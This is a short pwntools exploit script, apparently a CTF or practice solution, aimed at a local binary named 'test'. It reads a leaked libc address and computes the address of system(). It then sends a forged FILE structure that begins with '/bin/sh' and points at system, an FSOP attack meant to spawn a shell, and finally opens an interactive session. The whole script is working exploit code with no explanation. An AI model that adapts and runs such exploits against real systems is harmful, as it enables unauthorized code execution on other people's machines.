from pwn import *
elf = context.binary = ELF("./test")
context.log_level = "debug"

io = process()
gdb.attach(io)
io.recvuntil(b":")
libc_leak = int(io.recvline()[:-1],0x10)
log.critical(f"libc: {hex(libc_leak-0xad080)}")
system = libc_leak+0x4e0c0-0xad080
fsop = b"/bin/sh\x00"#0x0
fsop +=pack(0x0)*4#0x20
fsop+=pack(0x0)#0x28
fsop+=pack(0x0)#0x30
fsop+=pack(0x1)#0x38
fsop+=pack(0x0)#0x40
fsop+=pack(system)#0x48

io.sendline(fsop)





io.interactive()